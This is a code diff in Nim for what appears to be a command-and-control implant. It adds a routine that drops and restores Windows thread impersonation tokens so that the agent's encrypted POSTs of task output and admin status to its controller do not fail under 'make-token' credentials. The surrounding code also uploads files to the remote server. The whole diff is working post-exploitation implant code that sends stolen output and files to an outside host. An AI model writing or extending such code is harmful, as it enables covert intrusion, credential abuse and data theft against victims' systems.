@@ -227,15 +227,35 @@ else:
         result.add(task)
     except: discard
 
+  proc postWithRevert(t: var AgentTransport; path: string; body: seq[byte]) =
+    ## Drop thread impersonation so WinHTTP uses the process primary token.
+    ## A make-token LOGON_NEW_CREDENTIALS context can cause WinHTTP POSTs to
+    ## fail silently; reverting before the POST and restoring after is safe.
+    when defined(windows):
+      var hSavedImp: HANDLE = 0
+      block:
+        var hTh: HANDLE = 0
+        if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, WINBOOL(1), addr hTh) != 0:
+          discard DuplicateTokenEx(hTh, TOKEN_ALL_ACCESS, nil,
+                                   SecurityImpersonation, TokenImpersonation, addr hSavedImp)
+          discard CloseHandle(hTh)
+          discard RevertToSelf()
+      discard t.httpDo("POST", path, body)
+      if hSavedImp != 0:
+        discard ImpersonateLoggedOnUser(hSavedImp)
+        discard CloseHandle(hSavedImp)
+    else:
+      discard t.httpDo("POST", path, body)
+
   proc sendResult*(t: var AgentTransport; taskId: int64; output, errStr: string) =
     let plain = cast[seq[byte]]($(%*{"task_id": taskId, "output": output, "error": errStr}))
-    discard t.httpDo("POST", "/result/" & t.agentId, sealGCM(t.aesKey, plain))
+    t.postWithRevert("/result/" & t.agentId, sealGCM(t.aesKey, plain))
 
   proc sendResultAdmin*(t: var AgentTransport; taskId: int64;
                         output, errStr: string; isAdmin: bool) =
     let plain = cast[seq[byte]]($(%*{
       "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
-    discard t.httpDo("POST", "/result/" & t.agentId, sealGCM(t.aesKey, plain))
+    t.postWithRevert("/result/" & t.agentId, sealGCM(t.aesKey, plain))
 
   proc uploadFile*(t: var AgentTransport; taskId: int64; filename: string; data: seq[byte]) =
     discard t.httpDo("POST", "/upload/" & t.agentId & "/" & filename, sealGCM(t.aesKey, data))
